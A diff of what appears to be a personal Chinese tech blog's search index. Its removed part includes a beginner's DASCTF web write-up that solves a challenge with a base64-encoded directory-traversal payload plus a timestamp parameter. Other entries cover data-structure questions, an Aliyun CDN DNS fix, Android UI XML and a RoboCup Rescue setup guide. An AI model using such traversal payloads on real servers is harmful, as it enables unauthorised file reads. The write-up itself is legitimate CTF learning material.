-<p>看到f=后面那一串东西，一下子想到了base64编码，尝试解一波码，解出来<code>gqy.jpg</code>，先留着，说不定有用。</p>
-<p>试了一下image.php,回显：<strong>you miss some parameters</strong>（你漏掉了一些参数）奥，可能后面的t,f也得跟着，复制粘贴上去，再回车，页面回显：<strong>what’s your time ?</strong></p>
-<p>作为一个萌新，我一度怀疑这是不是什么CTF黑话，特意百度了一波 <em><strong>CTF what’s your time?</strong></em>  好吧，并不是，想了想，可能是要给time这个参数赋值，盲猜可能是URL中的t参数，试着把t参数删掉，回车，回显提醒漏掉参数，给t赋值为time试试？还是问我时间！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">😩</span>但是时间一直是变化的呀，，，怎么搞呢？关键在于那个t后面的一串数字是啥，我又去百度了一波CTF中的数字编码，没啥结果。卡住。</p>
-<p>求助大佬（emmm，应该不算犯规吧）大佬说那一串数字是<strong>unix时间戳</strong>，百度了一波，相当于那一串数字其实表示的是一个时间</p>
-<img src="/2020/07/25/DASCTF/image-20200725172909110.png" alt="image-20200725172909110" style="zoom:67%;">
-
-<p>还是那个问题，该怎么传当前时间？？？当前时间一直在变化的呀。</p>
-<p>此处贴出大佬的方法：</p>
-<img src="/2020/07/25/DASCTF/image-20200725173059630.png" alt="image-20200725173059630" style="zoom:80%;">
-
-<p>python脚本，，，好吧，我是靠<code>.py</code>这个后缀猜的<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">😰</span></p>
-<p>菜鸡的我再次流下了伤心的类水，咱也不会写python脚本呀（一打开我满是灰尘的pycharm还出错了，大家还是支持正版吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span>）</p>
-<p>不会脚本，只能靠手速了，按照大佬的指导，先转换一个10秒后的时间戳。等到时候再发（妙啊）</p>
-<p>一顿操作猛如虎，以为flag呼之欲出了，结果出来的是一堆乱码，淦！</p>
-<img src="/2020/07/25/DASCTF/image-20200725173839845.png" alt="image-20200725173839845" style="zoom:50%;">
-
-<p>搞了半天居然没用。。。</p>
-<p>后来大佬提示我去看看攻防世界 warmup 这道题的wp,<strong>目录穿越，flag在根目录</strong>，去找了一波wp学习了一下，感觉两个题的确蛮像的，不过那个题源码有提示，这个题看不了源码。我模仿那道题的wp试了试 <code>?file=index.php?/../../../../../../flag</code>不行，又试了试它的各种变形体，失败。我感觉应该没啥问题呀（<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8">⬅</span>菜鸡的蜜汁自信）</p>
-<p>去问大佬这个姿势错在哪,大佬说不是file=而是f=,我照做了，吧上面那个payload里的file改成了f,还是不行呀。</p>
-<p>再次寻求help,大佬让我看看时间对不对，一惊，<strong>还得用时间？</strong> （不是说没卵用的吗，，手动狗头，，）</p>
-<p>原来每次都必须t=当前时间戳&amp;f=xxx(这边就解释了为啥是f而不是file了，我还是后来才醒悟)  好吧好吧，先去转换一个20秒后的时间戳，打开手机读秒，我感觉到了胜利的曙光<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">😁</span></p>
-<p>一回车，妈耶，还是不行呀，奥，那个f=xxx，xxx应该像他原来url里那样用base64编一下码的，害，这脑子。去在线编码网站把<code>index.php?/../../../../../../flag</code> base64编码一下，编码完发现它居然后面没有两个==, 我不会又被在线编码网站给制裁了吧？<img src="/2020/07/25/DASCTF/image-20200725180857115.png" alt="image-20200725180857115">将信将疑地将它复制过去，又开始手动传时间（卑微.jpg），居然成功得到了flag!</p>
-<p>一波三折，跌宕起伏，柳暗花明。</p>
-<hr>
-<p><strong>参赛体验：</strong></p>
-<p>1.有机会一定学习一下python脚本，手速传时间实在是卑微</p>
-<p>2.多刷题！多刷题！多刷题！多涨涨见识才能触类旁通</p>
-<p>第一次参赛，纪念一下吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span></p>
-<p><img src="/2020/07/25/DASCTF/image-20200725181614351.png" alt="image-20200725181614351"></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据结构疑问</title>
-    <url>/2021/03/16/DSQuestion/</url>
-    <content><![CDATA[<p>记录《数据结构》中的一些问题</p>
-<h4 id="1-时间复杂度O-1-与O-n-的区别？"><a href="#1-时间复杂度O-1-与O-n-的区别？" class="headerlink" title="1.时间复杂度O(1)与O(n)的区别？"></a>1.时间复杂度O(1)与O(n)的区别？</h4><p><img src="/2021/03/16/DSQuestion/image-20210316215804952.png" alt="image-20210316215804952"></p>
-<p><img src="/2021/03/16/DSQuestion/image-20210316220103135.png" alt="image-20210316220103135"></p>
-<h4 id="2-随机存取"><a href="#2-随机存取" class="headerlink" title="2.随机存取"></a>2.随机存取</h4><p>根据存储位置是否可计算（是否有一个计算地址的公式）来判断该数据结构是否具备随机存取的特性，如数组知道首地址就可计算后面所有元素的地址</p>
-<h4 id="第四章-数组和特殊矩阵"><a href="#第四章-数组和特殊矩阵" class="headerlink" title="第四章  数组和特殊矩阵"></a>第四章  数组和特殊矩阵</h4><h5 id="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"><a href="#对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？" class="headerlink" title="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"></a>对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？</h5><p>文件压缩有很多种，包含了稀疏矩阵</p>
-<h5 id="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"><a href="#为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除" class="headerlink" title="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"></a>为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除</h5><p>数组是静态数据结构，本质上没有插入和删除运算</p>
-<h5 id="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"><a href="#为什么稀疏矩阵压缩存储后，必会失去随机存取功能？" class="headerlink" title="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"></a>为什么稀疏矩阵压缩存储后，必会失去随机存取功能？</h5><p>因为在这种矩阵中，非零元素的分布是没有规律的，为了压缩存储，就将每一个非零元素的值和它所在的行、列号做为一个结点存放在一起，这样的结点组成的线性表中叫三元组表，它已不是简单的向量，所以无法用下标直接存取矩阵中的元素（没有一个计算公式）。</p>
-<h5 id="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"><a href="#动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？" class="headerlink" title="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"></a>动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？</h5><p>先申请一块指定大小的内存块区域</p>
-<h5 id="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"><a href="#动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？" class="headerlink" title="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"></a>动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？</h5><img src="/2021/03/16/DSQuestion/image-20210318140952671.png" alt="image-20210318140952671" style="zoom:80%;">
-
-<p>无论是动态数组还是静态数组，数组长度确定下来后存储空间就确定了，所以静态和动态数组都是静态数据结构</p>
-<p>静态数据结构通常不会去定义插入、删除操作</p>
-<p><img src="/2021/03/16/DSQuestion/image-20210318141309092.png" alt="image-20210318141309092"></p>
-<h5 id="假如数组下标不是从0开始，而是从1开始，会影响到什么？"><a href="#假如数组下标不是从0开始，而是从1开始，会影响到什么？" class="headerlink" title="假如数组下标不是从0开始，而是从1开始，会影响到什么？"></a>假如数组下标不是从0开始，而是从1开始，会影响到什么？</h5><p>lacation计算里会出现一个-1计算</p>
-<h5 id="n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？"><a href="#n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？" class="headerlink" title="n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？"></a>n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？</h5><p>n、t都是可变的，是<strong>变量</strong>，所以不能写成O(1)，又不知道n、t哪个大，所以不能写成O(n)或者O(t).在某些情况下，如果知道n,t的大小情况的话是可以写成O(较大的那个)</p>
-<h5 id="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"><a href="#我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？" class="headerlink" title="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"></a>我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？</h5><p>更节省空间的暂无</p>
-<p>更易进行矩阵运算的有很多（分块啥的）</p>
-<h5 id="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"><a href="#用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？" class="headerlink" title="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"></a>用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？</h5><h5 id="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"><a href="#如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？" class="headerlink" title="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"></a>如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？</h5><p>可以查查matlab是怎么实现的</p>
-<h5 id="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"><a href="#C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？" class="headerlink" title="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"></a>C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？</h5><img src="/2021/03/16/DSQuestion/image-20210318140758524.png" alt="image-20210318140758524" style="zoom:80%;">
-
-<h5 id="稀疏矩阵的快速转置算法“快速”的代价是什么？"><a href="#稀疏矩阵的快速转置算法“快速”的代价是什么？" class="headerlink" title="稀疏矩阵的快速转置算法“快速”的代价是什么？"></a>稀疏矩阵的快速转置算法“快速”的代价是什么？</h5><p>存储空间增加了</p>
-<h5 id="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"><a href="#稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗" class="headerlink" title="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"></a>稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗</h5><p>按书上那么做的话是必要的</p>
-<p><img src="/2021/03/16/DSQuestion/image-20210318152228362.png" alt="image-20210318152228362"></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>数据结构</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0xCTF web题 writeup</title>
     <url>/2020/07/05/0xctf/</url>
     <content><![CDATA[<p>最近开始接触CTF，主要是web方向，作为一个小白，遭受了各种社会的毒打,好在有大佬指路，勉强能解出些题来，这篇博文主要写写0xCTF中题目的writeup.</p>
@@ -887,8 +347,548 @@ http://url/CVS/Entries 返回所有文件的结构
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>CTF</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>阿里云CDN加速域名解析冲突问题</title>
+    <url>/2020/10/11/ALi/</url>
+    <content><![CDATA[<p>自己的个人博客搭建了也有一段时间了，以前部署在Gitee上访问速度还行，后来部署到GitHub后速度是一天不如一天了，于是想看看能不能加速一下，看了看网上的做法，我选择采用CDN加速域名。</p>
+<p>首先，你需要将域名进行备案，备案完成后才能进行后续操作。</p>
+<p>然后我选择的是阿里云的CDN（腾讯云貌似有6个月的免费试用，但是由于我是阿里云的域名，去腾讯云搞又得在那边域名备案，就放弃了）</p>
+<p>前面按照网上的步骤走都没啥问题，但当进行到向域名解析中添加一条CNAME记录时显示与A解析冲突（<strong>A解析是当初绑定域名的时候添加的</strong>），我看了看阿里云提供的Tip，但是我还是不太明白怎么操作，尝试将原来的A解析删除，换成CNAME，换完发现我的博客直接502了。后来联系阿里云客服才将问题解决。</p>
+<p>如果你也出现了同样的问题，首先，你检查一下你将顶级域名添加到CDN时设置的源站IP是不是A解析记录里的那个IP（我犯的错是将源站IP设置成了阿里云服务器的IP），如果不是，改过来，然后删除A解析，添加CNAME解析（CNAME解析的添加根据提示做就行了），然后就大功告成了。</p>
+<hr>
+<p>u1s1,阿里云的客服态度蛮好的，晚上10点多了还为我耐心解答问题，在此致谢！</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>CDN 解析冲突</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android</title>
+    <url>/2021/03/17/Android/</url>
+    <content><![CDATA[<h4 id="1-边框圆角化"><a href="#1-边框圆角化" class="headerlink" title="1.边框圆角化"></a>1.边框圆角化</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;shape
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shape="rectangle"&gt;
+    &lt;!-- 填充的颜色 --&gt;
+    &lt;solid android:color="#EEB422" /&gt;
+    &lt;!-- android:radius 弧形的半径 --&gt;
+    &lt;!-- 设置按钮的四个角为弧形 --&gt;
+    &lt;corners
+        android:radius="20dip" /&gt;
+    &lt;!--也可单独设置--&gt;
+    &lt;!-- &lt;corners --&gt;
+    &lt;!-- android:topLeftRadius="10dp"--&gt;
+    &lt;!-- android:topRightRadius="10dp"--&gt;
+    &lt;!-- android:bottomRightRadius="10dp"--&gt;
+    &lt;!--  android:bottomLeftRadius="10dp"--&gt;
+    &lt;!--   /&gt;  --&gt;
+    **设置文字padding**
+    &lt;!-- padding：Button里面的文字与Button边界的间隔 --&gt;
+    &lt;padding
+        android:left="5dp"
+        android:top="3dp"
+        android:right="5dp"
+        android:bottom="3dp"
+        /&gt;
+&lt;/shape&gt;
+</code></pre>
+<h4 id="2-背景颜色渐变"><a href="#2-背景颜色渐变" class="headerlink" title="2.背景颜色渐变"></a>2.背景颜色渐变</h4><pre><code class="line-numbers language-java">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;shape xmlns:android="http://schemas.android.com/apk/res/android"&gt;
+    &lt;!--实现应用背景颜色渐变--&gt;
+    &lt;gradient
+        android:startColor="#FFF8DC"
+        android:endColor="#FFE1FF"
+        android:angle="270"/&gt;
+    &lt;corners
+        android:radius="20dip"
+        android:topLeftRadius="0dp"
+        android:topRightRadius="0dp"/&gt;
+&lt;/shape&gt;
+</code></pre>
+<h4 id="3-Button背景色修改无效"><a href="#3-Button背景色修改无效" class="headerlink" title="3.Button背景色修改无效"></a>3.Button背景色修改无效</h4><p>找到main/res/values/themes.xml文件</p>
+<p>将其中的<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar"&gt;</code></p>
+<p>修改为<code>&lt;style name="Theme.MyRegistration" parent="Theme.MaterialComponents.DayNight.DarkActionBar.Bridge"&gt;</code>即可</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>技术学习</category>
+      </categories>
+      <tags>
+        <tag>Android UI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROBOCUP RESCUE 示例代码演示</title>
+    <url>/2022/03/20/Apollo/</url>
+    <content><![CDATA[<p>用于记录给学弟学妹们讲解简单的运行服务器和挂载智能体的知识</p>
+<h3 id="一、VMware的安装"><a href="#一、VMware的安装" class="headerlink" title="一、VMware的安装"></a>一、VMware的安装</h3><p>方法一：去官网下载，然后去网上找相关的许可证</p>
+<p>方法二：<a href="http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd">http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd</a></p>
+<p>（微信公众号里的资源）</p>
+<h3 id="二、Ubuntu的安装"><a href="#二、Ubuntu的安装" class="headerlink" title="二、Ubuntu的安装"></a>二、Ubuntu的安装</h3><blockquote>
+<p>建议直接使用我发在群里的迅雷链接下，那样会快很多。</p>
+</blockquote>
+<p>下面两个方法只是给出作为参考，不建议使用，如果使用记得看好版本，下载<strong>Ubuntu18.04</strong>.</p>
+<p>方法一：Ubuntu官网：</p>
+<p><a href="https://cn.ubuntu.com/?_ga=2.176887340.845118543.1645454480-1361094071.1630542545">企业开源和Linux | Ubuntu</a>（中文站）</p>
+<img src="/2022/03/20/Apollo/image-20220222144723106.png" alt="image-20220222144723106" style="zoom:33%;">
+
+<blockquote>
+<p>切记选择桌面系统，不要去选服务器版，服务器版没有图形界面</p>
+</blockquote>
+<p>方法二：清华镜像源</p>
+<p><a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
+<img src="/2022/03/20/Apollo/image-20220222144944607.png" alt="image-20220222144944607" style="zoom:33%;">
+
+<img src="/2022/03/20/Apollo/image-20220222145131330.png" alt="image-20220222145131330" style="zoom: 33%;">
+
+<h3 id="三、Ubuntu虚拟机的创建"><a href="#三、Ubuntu虚拟机的创建" class="headerlink" title="三、Ubuntu虚拟机的创建"></a>三、Ubuntu虚拟机的创建</h3><p>相关的教程网上有许多，可相互参考着来，找了几篇供大家参考(18.04与20.04的安装过程差不多，也可以作为参考)</p>
+<p><a href="https://www.jb51.net/article/187313.htm">VMware15虚拟机安装Ubuntu18.04的图文教程_VMware_脚本之家 (jb51.net)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/355314438">史上最全最新Ubuntu20.04安装教程（图文） - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.cnblogs.com/ubuntuanzhuang/p/12934044.html">ubuntu20.04安装教程,ubuntu详细安装教程20.04 - ubuntu安装配置教程 - 博客园 (cnblogs.com)</a></p>
+<p><strong>【注意】</strong>:<font color="red">考虑到以后运行服务器时的速度，建议在安装时将内存尽量选大一点，电脑允许的话选择4096MB或者更高吧。磁盘大小的话选择40G或者更大。</font></p>
+<img src="/2022/03/20/Apollo/image-20220318203527795-16512372663262.png" alt="image-20220318203527795" style="zoom: 50%;">
+
+<img src="/2022/03/20/Apollo/image-20220318203601453-16512372663261.png" alt="image-20220318203601453" style="zoom: 50%;">
+
+<p>安装完成后进入Ubuntu（我这里演示用的是Ubuntu２１，所以界面看起来可能不太一样）</p>
+<img src="/2022/03/20/Apollo/image-20220222150520871.png" alt="image-20220222150520871" style="zoom:33%;">
+
+<blockquote>
+<p>为了操作便捷，建议再安装一下vmware tools，可以参考下面那个链接中的方式安装，也可以自己百度一些其他的博客。关于如何知道是否安装成功vmware tools，可以尝试将自己主机中的一个txt文档拖拽进 Ubuntu中（拖进某个文件夹，直接拖到桌面好像不行），如果可以的话说明vmware tools已经安装好了。</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/VagueCheung/p/13535687.html">VMware虚拟机安装Ubuntu18.04教程（图文） - VagueCheung - 博客园 (cnblogs.com)</a></p>
+<h3 id="四、配置相关环境"><a href="#四、配置相关环境" class="headerlink" title="四、配置相关环境"></a>四、配置相关环境</h3><h4 id="JDK的安装"><a href="#JDK的安装" class="headerlink" title="JDK的安装"></a>JDK的安装</h4><p>桌面右键，选择打开终端，使用命令<code>sudo apt install openjdk-17-jdk</code>安装JDK１７</p>
+<img src="/2022/03/20/Apollo/image-20220318204516525-16512372663263.png" alt="image-20220318204516525" style="zoom: 67%;">
+
+<blockquote>
+<p>如果这里下载的速度很慢，只有十几kb/s，那么建议<strong>换源</strong></p>
+<p>一篇讲的很清楚的换源教程：</p>
+<p><a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">Linux]Ubuntu 20.04换阿里源_wangyijieonline的博客-CSDN博客_ubuntu 阿里源</a></p>
+</blockquote>
+<p>在安装完成后再次输入 <code>java -version</code> 和 <code>javac -version</code>，出现相应的版本号即安装成功</p>
+<img src="/2022/03/20/Apollo/image-20220318204617743-16512372663264.png" alt="image-20220318204617743" style="zoom:67%;">
+
+<h4 id="Git与Gradle的安装："><a href="#Git与Gradle的安装：" class="headerlink" title="Git与Gradle的安装："></a>Git与Gradle的安装：</h4><p>在终端输入 <code>gradle -version</code>尝试查看gradle版本，未安装的情况下会提示命令找不到，然后会提示你相关的安装命令（类似这种 <code>sudo apt-get install gradle</code> ），复制下来回车安装即可（因为我在演示前已经安装了，此处直接显示的就是gradle版本号了，你们按照提示安装即可）。</p>
+<p>git的安装与gradle类似，都是先尝试查看版本号，然后根据提示安装。</p>
+<img src="/2022/03/20/Apollo/image-20220318212528084-16512372663265.png" alt="image-20220318212528084" style="zoom: 67%;">
+
+<h3 id="五、服务器的运行"><a href="#五、服务器的运行" class="headerlink" title="五、服务器的运行"></a>五、服务器的运行</h3><h4 id="1-下载压缩包"><a href="#1-下载压缩包" class="headerlink" title="1.下载压缩包"></a>1.下载压缩包</h4><p>在Home目录下（或者其他位置）新建一个文件夹Apollo，然后将服务器和示例代码压缩包复制进来，压缩包没有的可以去下面这个链接自取</p>
+<p>链接：<a href="https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA">https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA</a><br>提取码：rcrs</p>
+<img src="/2022/03/20/Apollo/image-20220318205716154-16512372663266.png" alt="image-20220318205716154" style="zoom:67%;">
+
+<p>可以先下载到windows主机，然后将整个压缩包复制到虚拟机中。</p>
+<p>然后右键“提取到此处”进行解压缩</p>
+<img src="/2022/03/20/Apollo/image-20220318210150116-16512372663267.png" alt="image-20220318210150116" style="zoom:67%;">
+
+<p>继续将里面的两个压缩包解压缩，得到如下两个文件夹。</p>
+<img src="/2022/03/20/Apollo/image-20220318210259946-16512372663268.png" alt="image-20220318210259946" style="zoom:67%;">
+
+<h4 id="2-服务器的运行"><a href="#2-服务器的运行" class="headerlink" title="2.服务器的运行"></a>2.服务器的运行</h4><p>首先进入rcrs-server-master文件夹，右键打开终端，输入指令进行编译：</p>
+<pre><code>./gradlew completeBuild
+</code></pre>
+<img src="/2022/03/20/Apollo/image-20220318210442941-16512372663279.png" alt="image-20220318210442941" style="zoom: 50%;">
+
+<p>编译成功后终端会显示 BUILD SUCESSFULLY</p>
+<img src="/2022/03/20/Apollo/image-20220318210624211-165123726632710.png" alt="image-20220318210624211" style="zoom:50%;">
+
+<p>接着输入以下指令来进入scripts文件夹：(cd是进入某个文件夹的命令，可以自己去了解了解<strong>Linux常用命令</strong>)</p>
+<pre><code>cd scripts
+</code></pre>
+<p>然后使用以下指令启动服务器：</p>
+<pre><code>bash start.sh -m ../maps/test/map -c ../maps/test/config
+</code></pre>
+<blockquote>
+<p>start.sh是一个用来启动的脚本，bash是执行这个脚本的命令</p>
+<p><strong>-m</strong> 用来指定地图  ..是指的父目录（上一级目录，即rcrs-server-master文件夹，因为前面用 cd scripts命令进入了该目录下的scripts文件夹） ../maps/test/map 指的就是上一级目录中的maps、test/map,大家可以自己在文件夹里点进去看看，确实存在的</p>
+<p><strong>-c</strong> 用来指定地图配置文件 ../maps/test/config 大家也可以自己去找一下看看，也确实存在</p>
+</blockquote>
+<img src="/2022/03/20/Apollo/image-20220318210755610-165123726632711.png" alt="image-20220318210755610" style="zoom:50%;">
+
+<p>命令执行后等待一会儿服务器就会成功启动，如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318210936867-165123726632712.png" alt="image-20220318210936867" style="zoom:50%;">
+
+
+
+<h4 id="3-智能体的挂载"><a href="#3-智能体的挂载" class="headerlink" title="3.智能体的挂载"></a>3.智能体的挂载</h4><p>服务器启动成功后就要把相关的智能体挂载上去，可以理解为把我们写好的代码连接上服务器，让它能够去控制智能体的行动。</p>
+<p>首先不要关闭之前的终端，也不要关闭服务器。Ctrl+D回到桌面，进入之前解压缩好的adf-sample-agent-java文件夹，然后右键进入终端，输入以下命令：</p>
+<pre><code>./gradlew clean
+</code></pre>
+<pre><code>./gradlew build
+</code></pre>
+<p>然后就会对代码进行编译，编译成功后的界面如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318211123118-165123726632714.png" alt="image-20220318211123118" style="zoom:50%;">
+
+<p>然后使用以下命令挂载智能体：</p>
+<pre><code>bash launch.sh -all
+</code></pre>
+<img src="/2022/03/20/Apollo/image-20220318211226261-165123726632713.png" alt="image-20220318211226261" style="zoom: 67%;">
+
+<p>终端会显示成功挂载的智能体数量，如下图所示则为挂载成功：</p>
+<img src="/2022/03/20/Apollo/image-20220318211409355-165123726632717.png" alt="image-20220318211409355" style="zoom: 67%;">
+
+<p>进度条会一直卡在75%，这时去之前开启的服务器，可以直接点击左侧的图标，进到服务器后直接点Run，然后就能开始跑图。</p>
+<img src="/2022/03/20/Apollo/image-20220318211530508-165123726632716.png" alt="image-20220318211530508" style="zoom: 50%;">
+
+<p>如下图所示，Time指的是回合数，Score指的是分数。</p>
+<img src="/2022/03/20/Apollo/image-20220318211704356-165123726632715.png" alt="image-20220318211704356" style="zoom: 67%;">
+
+<p>运行后的两个终端状况如下图所示</p>
